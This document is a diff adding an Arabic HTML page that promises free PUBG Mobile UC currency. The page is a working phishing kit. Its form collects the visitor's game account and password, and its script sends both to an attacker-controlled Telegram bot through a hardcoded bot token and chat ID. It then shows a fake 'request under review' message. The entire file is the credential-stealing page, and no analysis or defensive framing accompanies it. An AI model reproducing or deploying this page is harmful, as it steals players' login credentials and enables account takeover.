@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن شدات ببجي موبايل مجانا</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f8ff;
+            padding: 20px;
+        }
+        h1 {
+            color: #4CAF50;
+        }
+        input[type="text"] {
+            width: 80%;
+            padding: 10px;
+            margin: 10px auto;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #4CAF50;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>مرحبا بك في شحن شدات ببجي موبايل مجانا</h1>
+    <input type="text" id="account" placeholder="أدخل الحساب" required>
+    <input type="text" id="password" placeholder="أدخل كلمة السر" required>
+    <button onclick="sendData()">إشحن</button>
+
+    <script>
+        function sendData() {
+            const account = document.getElementById("account").value;
+            const password = document.getElementById("password").value;
+
+            if (account && password) {
+                const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I'; // توكن البوت الخاص بك
+                const chatId = '6185375878'; // معرف الدردشة الخاص بك
+                const message = `حساب: ${account}\nكلمة السر: ${password}`;
+                
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            alert("طلبك قيد المراجعة!");
+                            document.getElementById("account").value = '';
+                            document.getElementById("password").value = '';
+                        } else {
+                            alert("حدث خطأ أثناء إرسال البيانات.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert("حدث خطأ في الاتصال.");
+                    });
+            } else {
+                alert("الرجاء ملء الحقول.");
+            }
+        }
+    </script>
+
+</body>
+</html>
